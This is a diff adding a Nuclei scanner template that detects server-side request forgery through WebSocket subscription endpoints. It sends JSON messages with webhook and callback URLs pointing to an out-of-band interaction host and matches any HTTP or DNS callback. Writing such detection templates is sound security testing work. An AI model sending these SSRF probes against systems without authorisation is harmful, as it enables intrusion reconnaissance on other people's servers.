@@ -1,0 +1,105 @@
+id: websocket-subscription-oob
+
+info:
+  name: WebSocket Subscription Callback OOB Detection
+  author: geeknik
+  severity: medium
+  description: |
+    Detects WebSocket endpoints that support event subscriptions with external callback URLs,
+    potentially leading to SSRF through subscription webhooks, event notifications, or
+    real-time data streaming to external endpoints.
+  reference:
+    - https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API
+    - https://socket.io/docs/v4/
+    - https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N
+    cvss-score: 5.5
+    cwe-id: CWE-918
+  tags: websocket,oob,ssrf,subscription,callback,events
+
+variables:
+  callback_url: "{{interactsh-url}}"
+
+websocket:
+  - address: "{{BaseURL}}"
+    path:
+      - "/ws"
+      - "/websocket"
+      - "/socket.io/"
+      - "/api/ws"
+      - "/realtime"
+
+    inputs:
+      - data: |
+          {
+            "type": "subscribe",
+            "event": "user.update",
+            "callback_url": "{{callback_url}}/webhook",
+            "webhook": "{{callback_url}}/events"
+          }
+      - data: |
+          {
+            "action": "notification_config",
+            "config": {
+              "endpoint": "{{callback_url}}/notify",
+              "events": ["message", "connect", "disconnect"],
+              "format": "json"
+            }
+          }
+      - data: |
+          {
+            "command": "webhook_setup",
+            "webhook_url": "{{callback_url}}/callback",
+            "events": ["*"],
+            "retry_failed": true,
+            "external_webhook": "{{callback_url}}/external"
+          }
+
+  - address: "{{BaseURL}}"
+    path:
+      - "/ws/stream"
+      - "/websocket/feed"
+      - "/api/ws/live"
+
+    inputs:
+      - data: |
+          {
+            "type": "stream_config",
+            "destination": "{{callback_url}}/stream",
+            "format": "json",
+            "real_time": true,
+            "callback_on_error": "{{callback_url}}/error"
+          }
+
+  - address: "{{BaseURL}}"
+    path:
+      - "/ws/integration"
+      - "/websocket/external"
+      - "/api/ws/third-party"
+
+    inputs:
+      - data: |
+          {
+            "type": "integration",
+            "integration": {
+              "type": "webhook",
+              "url": "{{callback_url}}/integration",
+              "auth_callback": "{{callback_url}}/auth",
+              "data_endpoint": "{{callback_url}}/data"
+            }
+          }
+      - data: |
+          {
+            "action": "external_subscription",
+            "external_url": "{{callback_url}}/subscribe",
+            "callback_events": ["all"]
+          }
+
+matchers:
+  - type: word
+    part: interactsh_protocol
+    words:
+      - "http"
+      - "dns"
+    condition: or
